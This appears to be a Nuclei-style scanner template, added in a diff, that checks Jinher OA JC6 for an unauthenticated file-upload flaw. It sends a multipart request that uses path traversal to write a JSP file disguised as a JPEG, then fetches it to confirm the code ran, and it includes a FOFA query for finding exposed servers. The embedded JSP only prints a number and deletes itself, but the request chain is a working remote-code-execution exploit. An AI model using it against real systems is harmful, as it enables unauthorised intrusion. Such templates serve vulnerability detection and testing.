@@ -1,0 +1,62 @@
+id: jinher-oa-jc6-ntkoUpload-fileupload
+
+info:
+  name: 金和 OA jc6 ntkoUpload - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - todo
+  metadata:
+    veified: true
+    max-request: 1
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,oa,fileupload
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /jc6/ntkoUpload/ntko-upload!upload.action HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="filename"
+        
+        ../../../../upload/{{filename}}.jsp
+        ------{{boundary}}
+        Content-Disposition: form-data; name="upLoadFile"; filename="{{filename}}.jpg"
+        Content-Type: image/jpeg
+        
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------{{boundary}}
+        Content-Disposition: form-data; name="Submit"
+        
+        upload
+        ------{{boundary}}--
+
+
+      - |
+        GET /upload/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+    extractors:
+      - type: dsl
+        name: only_for_sleep
+        dsl:
+          - wait_for(3)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
